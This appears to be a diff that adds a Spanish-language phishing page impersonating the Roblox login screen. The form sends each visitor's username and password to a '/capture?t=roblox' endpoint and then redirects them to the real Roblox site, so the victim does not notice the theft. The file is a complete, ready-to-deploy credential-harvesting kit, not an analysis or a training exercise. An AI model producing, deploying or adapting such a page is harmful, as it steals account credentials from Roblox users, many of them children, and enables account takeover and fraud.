@@ -1,0 +1,28 @@
+  <!DOCTYPE html>
+  <html lang="es">
+  <head>
+    <meta charset="utf-8">
+    <title>Roblox - Iniciar sesión</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+      body{margin:0;background:#000;color:#fff;font-family:'Gotham',sans-serif;height:100vh;display:flex;align-items:center;justify-content:center}
+      .container{max-width:420px;width:90%;background:#111;padding:50px 40px;border-radius:16px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.8)}
+      h1{font-size:48px;margin-bottom:40px;color:#00ff00;text-shadow:0 0 20px #00ff00}
+      input{width:100%;padding:16px;margin:14px 0;background:#222;border:2px solid #444;border-radius:10px;color:#fff;font-size:17px}
+      input:focus{border-color:#00ff00;outline:none}
+      button{background:#00ff00;color:#000;padding:16px;border:none;border-radius:10px;width:100%;font-size:18px;font-weight:bold;cursor:pointer;margin-top:20px}
+      button:hover{background:#00cc00}
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Roblox</h1>
+      <form action="/capture?t=roblox" method="POST">
+        <input type="text" name="username" placeholder="Nombre de usuario" required autocomplete="username">
+        <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
+        <button type="submit">Iniciar sesión</button>
+        <input type="hidden" name="redirect" value="https://www.roblox.com">
+      </form>
+    </div>
+  </body>
+  </html>
